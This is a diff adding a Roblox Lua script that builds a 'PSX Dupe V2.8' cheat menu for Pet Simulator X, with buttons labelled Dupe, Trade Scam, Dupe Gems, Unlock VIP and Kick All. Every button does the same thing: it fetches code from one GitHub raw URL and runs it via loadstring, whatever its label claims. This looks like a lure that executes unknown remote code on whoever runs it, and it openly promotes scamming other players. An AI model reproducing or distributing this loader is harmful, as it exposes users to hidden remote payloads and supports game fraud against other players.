@@ -1,0 +1,119 @@
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local label = Instance.new("TextLabel")
+local UICorner = Instance.new("UICorner")
+local Dupe = Instance.new("TextButton")
+local UICorner_2 = Instance.new("UICorner")
+local TradeScam = Instance.new("TextButton")
+local UICorner_3 = Instance.new("UICorner")
+local DupeGems = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local UnlockVIP = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local KickAll = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local UICorner_7 = Instance.new("UICorner")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGUi
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(43, 43, 43)
+main.BorderColor3 = Color3.fromRGB(27, 42, 53)
+main.Position = UDim2.new(0.241487652, 0, 0.248031616, 0)
+main.Size = UDim2.new(0, 522, 0, 255)
+main.Active = true
+main.Draggable = true
+
+label.Name = "label"
+label.Parent = main
+label.BackgroundColor3 = Color3.fromRGB(27, 27, 27)
+label.BorderColor3 = Color3.fromRGB(27, 27, 27)
+label.Position = UDim2.new(0, 0, -0.00080075732, 0)
+label.Size = UDim2.new(0, 522, 0, 50)
+label.Font = Enum.Font.SciFi
+label.Text = "Welcome to PSX Dupe V2.8"
+label.TextColor3 = Color3.fromRGB(148, 148, 148)
+label.TextSize = 32.000
+label.TextWrapped = true
+
+UICorner.Parent = label
+
+Dupe.Name = "Dupe"
+Dupe.Parent = main
+Dupe.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+Dupe.Position = UDim2.new(0.0114942528, 0, 0.218807086, 0)
+Dupe.Size = UDim2.new(0, 257, 0, 91)
+Dupe.Font = Enum.Font.SciFi
+Dupe.Text = "Dupe"
+Dupe.TextColor3 = Color3.fromRGB(166, 166, 166)
+Dupe.TextSize = 59.000
+Dupe.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LilFragy/PET-SIM-X/main/Scripterz", true))()
+end)
+
+UICorner_2.Parent = Dupe
+
+TradeScam.Name = "Trade Scam"
+TradeScam.Parent = main
+TradeScam.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+TradeScam.Position = UDim2.new(0.0114942528, 0, 0.603120923, 0)
+TradeScam.Size = UDim2.new(0, 257, 0, 95)
+TradeScam.Font = Enum.Font.SciFi
+TradeScam.Text = "Trade Scam"
+TradeScam.TextColor3 = Color3.fromRGB(166, 166, 166)
+TradeScam.TextSize = 49.000
+TradeScam.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LilFragy/PET-SIM-X/main/Scripterz", true))()
+end)
+
+UICorner_3.Parent = TradeScam
+
+DupeGems.Name = "DupeGems"
+DupeGems.Parent = main
+DupeGems.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+DupeGems.Position = UDim2.new(0.519157171, 0, 0.222728595, 0)
+DupeGems.Size = UDim2.new(0, 244, 0, 61)
+DupeGems.Font = Enum.Font.SciFi
+DupeGems.Text = "Dupe Gems"
+DupeGems.TextColor3 = Color3.fromRGB(166, 166, 166)
+DupeGems.TextSize = 49.000
+DupeGems.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LilFragy/PET-SIM-X/main/Scripterz", true))()
+end)
+
+UICorner_4.Parent = DupeGems
+
+UnlockVIP.Name = "UnlockVIP"
+UnlockVIP.Parent = main
+UnlockVIP.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+UnlockVIP.Position = UDim2.new(0.519157171, 0, 0.49331677, 0)
+UnlockVIP.Size = UDim2.new(0, 244, 0, 58)
+UnlockVIP.Font = Enum.Font.SciFi
+UnlockVIP.Text = "Unlock VIP"
+UnlockVIP.TextColor3 = Color3.fromRGB(166, 166, 166)
+UnlockVIP.TextSize = 49.000
+UnlockVIP.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LilFragy/PET-SIM-X/main/Scripterz", true))()
+end)
+
+UICorner_5.Parent = UnlockVIP
+
+KickAll.Name = "KickAll"
+KickAll.Parent = main
+KickAll.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
+KickAll.Position = UDim2.new(0.519157171, 0, 0.752140284, 0)
+KickAll.Size = UDim2.new(0, 244, 0, 57)
+KickAll.Font = Enum.Font.SciFi
+KickAll.Text = "Kick All"
+KickAll.TextColor3 = Color3.fromRGB(166, 166, 166)
+KickAll.TextSize = 49.000
+KickAll.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LilFragy/PET-SIM-X/main/Scripterz", true))()
+end)
+
+UICorner_6.Parent = KickAll
+
+UICorner_7.Parent = main
